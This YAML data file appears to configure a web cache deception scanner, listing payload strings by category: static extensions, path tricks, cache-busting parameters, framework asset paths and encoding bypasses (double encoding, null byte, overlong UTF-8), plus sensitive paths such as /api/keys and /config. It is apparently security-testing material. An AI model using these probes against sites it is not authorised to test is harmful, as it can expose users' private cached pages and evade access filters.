category_map:
  extension:
    - css_ext
    - js_ext
    - png_ext
    - gif_ext
    - ico_ext
  path:
    - trailing_slash
    - double_slash
    - semicolon_path
    - fragment_bypass
    - case_path
  parameter:
    - cache_param
    - utm_source
    - cb_param
    - nocache_bypass
    - version_param
  framework:
    - django_static
    - flask_static
    - express_static
    - rails_asset
    - spring_static
  bypass:
    - double_encode
    - null_byte
    - unicode_path
    - backslash_path
    - case_extension

extension_payloads:
  - - css_ext
    - "/admin.css"
    - - admin
  - - js_ext
    - "/secret.js"
    - - secret
  - - png_ext
    - "/profile.png"
    - - profile
  - - gif_ext
    - "/data.gif"
    - - data
  - - ico_ext
    - "/auth.ico"
    - - auth

path_payloads:
  - - trailing_slash
    - "/admin/"
    - - admin
  - - double_slash
    - "/admin//"
    - - admin
  - - semicolon_path
    - "/admin;.css"
    - - admin
  - - fragment_bypass
    - "/admin#.css"
    - - admin
  - - case_path
    - "/Admin/"
    - - admin

parameter_payloads:
  - - cache_param
    - "?cache=1"
    - - "cache=1"
  - - utm_source
    - "?utm_source=test"
    - - utm_source
  - - cb_param
    - "?cb=12345"
    - - callback
  - - nocache_bypass
    - "?nocache=0"
    - - "nocache=0"
  - - version_param
    - "?v=1.0"
    - - version

framework_payloads:
  - - django_static
    - "/static/admin.css"
    - - admin
      - django
  - - flask_static
    - "/static/secret.js"
    - - secret
      - flask
  - - express_static
    - "/public/admin.css"
    - - admin
      - express
  - - rails_asset
    - "/assets/admin.css"
    - - admin
      - rails
  - - spring_static
    - "/resources/admin.css"
    - - admin
      - spring

bypass_payloads:
  - - double_encode
    - "/%2561dmin.css"
    - - admin
  - - null_byte
    - "/admin%00.css"
    - - admin
  - - unicode_path
    - "/%E0%80%80admin.css"
    - - admin
  - - backslash_path
    - "/\\admin.css"
    - - admin
  - - case_extension
    - "/admin.CSS"
    - - admin

sensitive_paths:
  - "/admin"
  - "/secret"
  - "/profile"
  - "/dashboard"
  - "/settings"
  - "/api/keys"
  - "/api/users"
  - "/internal"
  - "/debug"
  - "/config"
